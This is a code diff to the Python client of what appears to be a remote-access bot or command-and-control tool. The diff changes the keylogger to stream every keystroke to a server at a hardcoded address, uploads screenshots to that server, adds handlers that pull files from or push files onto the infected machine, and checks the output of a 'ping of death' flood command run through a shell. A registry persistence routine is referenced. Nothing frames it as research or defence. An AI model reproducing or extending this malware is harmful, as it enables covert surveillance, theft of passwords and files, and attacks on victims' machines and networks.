@@ -6,10 +6,12 @@ import winreg
 import os, uuid
 import subprocess
 import requests
-import pyscreenshot as ImageGrab
 from pynput import keyboard
 import socketio
+import pyautogui
 
+server_ip = '192.168.100.222'
+server_port = 8000
 info = {}
 client = socketio.Client()
 
@@ -20,13 +22,15 @@ keyloggerNumber = 1
 completedTasks = []
 hostname = socket.gethostname()
 
-def take_screenshot(hostname):
+def take_screenshot(idNumber,command,hostname):
     global screenshotNumber
     try:
         filename = f"{hostname}_screenshot_{screenshotNumber}.png"
         screenshot = os.path.join(filename)
-        im = ImageGrab.grab()
-        im.save(screenshot)
+        pyautogui.screenshot(screenshot)
+        with open(f'{filename}', 'rb') as file:
+            file_data = file.read()
+            client.emit('module_file', {'idNumber': idNumber, 'command': command, 'hostname' : hostname, 'file_name': filename, 'file_data' : file_data})
         screenshotNumber += 1
         return screenshot
     except Exception as e:
@@ -47,46 +51,40 @@ def try_persistence():
         return False
 
 def start_keylogger(key):
-    if not os.path.exists(f"{hostname}_keylogs.txt"):
-        open(f"{hostname}_keylogs.txt", 'a+').close()
-
-    with open(f"{hostname}_keylogs.txt", 'a') as logkey:
-        try:
-            char = key.char
-            logkey.write(char)
-        except AttributeError:
-            if key == keyboard.Key.space:
-                logkey.write(' ')
-            elif key == keyboard.Key.backspace:
-                logkey.write(' [BACKSPACE] ')
-            elif key == keyboard.Key.enter:
-                logkey.write(' \n ')
-            elif key == keyboard.Key.shift:
-                logkey.write(' [SHIFT] ')
-            elif key == keyboard.Key.tab:
-                logkey.write(' [TAB] ')
-            elif key == keyboard.Key.ctrl:
-                logkey.write(' [CTRL] ')
-            elif key == keyboard.Key.alt:
-                logkey.write(' [ALT] ')
-            elif key == keyboard.Key.caps_lock:
-                logkey.write(' [CAPS-LOCK] ')
-            elif key == keyboard.Key.num_lock:
-                logkey.write(' [NUM-LOCK] ')
-            elif key == keyboard.Key.esc:
-                logkey.write(' [ESC] ')
-            elif key == keyboard.Key.delete:
-                logkey.write(' [DELETE] ')
-            elif key == keyboard.Key.page_up:
-                logkey.write(' [PAGE-UP] ')
-            elif key == keyboard.Key.page_down:
-                logkey.write(' [PAGE-DOWN] ')
-            elif key == keyboard.Key.insert:
-                logkey.write(' [INSERT] ')
-            elif key == keyboard.Key.print_screen:
-                logkey.write(' [PRINT-SCREEN] ')
-            else:
-                pass
+    try:
+        char = getattr(key, 'char', None)
+        if char is not None:
+            client.emit('keylogs', {'hostname': hostname, 'key': char})
+        else:
+            special_keys = {
+                keyboard.Key.space: ' ',
+                keyboard.Key.backspace: ' [BACKSPACE] ',
+                keyboard.Key.enter: ' \n ',
+                keyboard.Key.shift: ' [SHIFT] ',
+                keyboard.Key.shift_l: ' [SHIFT] ',
+                keyboard.Key.shift_r: ' [SHIFT] ',
+                keyboard.Key.tab: ' [TAB] ',
+                keyboard.Key.ctrl: ' [CTRL] ',
+                keyboard.Key.ctrl_l: ' [CTRL] ',
+                keyboard.Key.ctrl_r: ' [CTRL] ',
+                keyboard.Key.alt: ' [ALT] ',
+                keyboard.Key.alt_l: ' [ALT] ',
+                keyboard.Key.alt_r: ' [ALT] ',
+                keyboard.Key.alt_gr: ' [ALT] ',
+                keyboard.Key.caps_lock: ' [CAPS-LOCK] ',
+                keyboard.Key.num_lock: ' [NUM-LOCK] ',
+                keyboard.Key.esc: ' [ESC] ',
+                keyboard.Key.delete: ' [DELETE] ',
+                keyboard.Key.page_up: ' [PAGE-UP] ',
+                keyboard.Key.page_down: ' [PAGE-DOWN] ',
+                keyboard.Key.insert: ' [INSERT] ',
+                keyboard.Key.print_screen: ' [PRINT-SCREEN] ',
+            }
+            special_key = special_keys.get(key)
+            if special_key:
+                client.emit('keylogs', {'hostname': hostname, 'key': special_key})
+    except Exception as e:
+        print("ERROR: Could not process key:", e)
 
 @client.on('ping')
 def handle_ping(ping):
@@ -96,8 +94,16 @@ def handle_ping(ping):
     try:
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         for line in iter(process.stdout.readline, b''):
-            if f'Pinging {ip_address} with 65500 bytes of data' in line:
+            if f'Reply from {ip_address}: bytes=65500 time<1ms TTL=128' in line:
                 output = "PING-OF-DEATH Command Executed Successfully"
+                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
+                break
+            elif f'Reply from {ip_address}: Destination host unreachable.' in line:
+                output = "ERROR : Destination host unreachable."
+                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
+                break
+            else:
+                output = "ERROR : Command Did not give proper Output"
                 client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                 break
         else:
@@ -127,7 +133,7 @@ def handle_commands(commands):
 
 @client.on("module")
 def message(module):
-    global persistenceVariable, keyloggerNumber, completedTasks, keyloggerVaraible
+    global persistenceVariable, completedTasks, keyloggerVaraible
     idNumber = module.get('idNumber')
     command = module.get('command')
     hostname = module.get('hostname')
@@ -146,7 +152,7 @@ def message(module):
                 result = "Persistence Key Already Added"
                 module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
         elif command == 'screenshot':
-            screenshot_pic = take_screenshot(hostname)
+            screenshot_pic = take_screenshot(idNumber,command,hostname)
             if isinstance(screenshot_pic, str):
                 result = f"Screenshot Has Been Captured"
                 module_output = {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'DATA': result}
@@ -171,8 +177,37 @@ def message(module):
     except Exception as e:
         print("ERROR : ", str(e))
 
-def send_output_to_server(output):
-    client.emit('message', output)
+@client.on('download')
+def upload(input):
+    idNumber = input.get('idNumber')
+    transfer_type = input.get('transfer_type')
+    hostname = input.get('hostname')
+    file_name = input.get('file_name')
+    if transfer_type == 'download':
+        try:
+            with open(f'{file_name}', 'rb') as file:
+                file_data = file.read()
+            client.emit('download_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
+        except:
+            file_data = "File Could not be Read from Client"
+            client.emit('download_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
+
+@client.on('upload')
+def download(input):
+    idNumber = input.get('idNumber')
+    transfer_type = input.get('transfer_type')
+    hostname = input.get('hostname')
+    file_name = input.get('file_name')
+    file_data = input.get('file_data')
+    if transfer_type == 'upload':
+        try:
+            with open(file_name, 'wb') as file:
+                file.write(file_data)
+                status = "File Has Been Uploaded SuccessFully form Client"
+            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
+        except:
+            status = "File Could not be Uploaded from Client"
+            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
 
 info['COMMAND'] = 'INFO'
 info["idNumber"] = str(uuid.uuid4())
@@ -184,13 +219,13 @@ info["IP"] = requests.get('https://api.ipify.org').text
 def connect():
     info['sid'] = client.sid
     client.emit('Initial_Information', info)
-    print('SUCCESSFULLY CONNECTIED TO THE SERVER ✅')
+    print('CLIENT SUCCESSFULLY CONNECTIED TO THE SERVER ✅')
 
 @client.event
 def disconnect():
-    print('PAINFULLY DISCONNECTED FROM THE SERVER ❌')
+    print('CLIENT PAINFULLY DISCONNECTED FROM THE SERVER ❌')
     client.emit('message', {'COMMAND': 'OUTPUT', 'idNumber': info['idNumber'], 'command': 'status update', 'DATA': 'Bot is dead'})
 
-print("CONNECTING TO THE SERVER ⏳ ")
-client.connect('http://192.168.100.222:5000')
+print(f"CONNECTING TO THE SERVER {server_ip}:{server_port} ⏳ ")
+client.connect(f'http://{server_ip}:{server_port}')
 client.wait()
